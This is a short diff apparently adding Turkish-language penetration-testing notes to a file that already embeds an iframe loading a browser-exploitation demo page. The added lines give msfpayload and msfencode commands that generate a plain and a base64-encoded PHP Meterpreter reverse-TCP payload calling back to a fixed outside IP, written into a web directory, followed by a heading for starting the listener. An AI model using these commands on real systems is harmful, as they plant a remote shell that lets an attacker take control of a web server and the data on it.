@@ -53,4 +53,16 @@ http://www.sysman.nl/wasdecoder/
 
 <iframe src=http://10.64.74.244:3000/demos/butcher/index.html>
 
+PHP Meterpreter Olusturma
+1.:
+msfpayload php/meterpreter/reverse_tcp LHOST=85.95.238.172 LPORT=8080 R > /var/www/bgabank/meterpreter.txt
+
+Encoded Meterpeter Olusturma
+1.1:
+msfpayload php/meterpreter/reverse_tcp LHOST=85.95.238.172 LPORT=8080 R | msfencode -e php/base64 -t raw > encoded.txt
+
+Dinleme moduna gecme
+
+
+
 
